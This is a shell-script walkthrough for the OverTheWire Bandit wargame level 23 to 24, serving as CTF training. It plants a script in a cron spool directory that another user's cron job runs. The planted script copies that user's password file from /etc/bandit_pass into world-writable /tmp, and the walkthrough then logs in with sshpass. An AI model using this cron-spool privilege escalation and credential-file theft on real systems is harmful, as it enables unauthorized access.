#!/usr/bin/bash

# ** aim is to get to level 24
# a programme is running at regular intervals because `cron`
# look in `/etc/cron.d` for configs and more info
# additional info 1: you may want to create a shell script
# additional info 2: your shell script is removec once executed;
# keep a copy around

cd /etc/cron.d
ls #a lot of cron jobs; focus on cronjob_bandit24
ls -la #cronjob_bandit24 is a regular file with 644 perms
cat cronjob_bandit24 #the job is to run the script `cronjob_bandit24.sh`  on 
#server `bandit24` every min of every hr of every day of every
#month of every weekday. said script is in `/usr/bin/`
cat /usr/bin/cronjob_bandit24.sh #bash file that executes then deletes the scripts
# inside `/var/spool/$username/foo` where `username` is any user (bandit24, of course)
# notice: it runs the file after 60s if the owner is `bandit23`
cd /var/spool/bandit24
ls #file `foo`
cd foo #permission denied
ls foo #permission denied
mkdir /tmp/pass_bandit24 && chmod 777 /tmp/pass_bandit24
cd /tmp/pass_bandit24
emacs getPass.sh #add the shell script below to the file
chmod 777 getpass.sh
cp getPass.sh /var/spool/bandit24/foo/
date #recall: runs every minute and deletes after executing; you may redo lines 25-27
#until you get the timing right
ls #password file. finally!

cat pass24_rcvd #found password. copy to clipboard or use xclip
cat pass24_rcvd | xclip

exit #back to our machine

# ** if copied manually
echo p4ssWord > passwd #use the password you copied to clipboard
# ** if used xclip
xclip -o | cat > passwd

sshpass -p $(cat passwd) ssh bandit24@bandit.labs.overthewire.org -p 2220

# command `cron` examines all stored crontabs, checking each command to see
# if it should be run in the current minute
# type `man cron` in terminal and press ENTER


##############################################################################
#                                                                            #
#           ADD THE FOLLOWING TO THE FILE YOU OPEN ON LINE 24                #
#                                                                            #
#                                                                            #
##############################################################################

# ** delete leading `#` and space
#  #!/usr/bin/bash
#  cat /etc/bandit_pass/bandit24 > /tmp/pass_bandit24/pass24_rcvd
#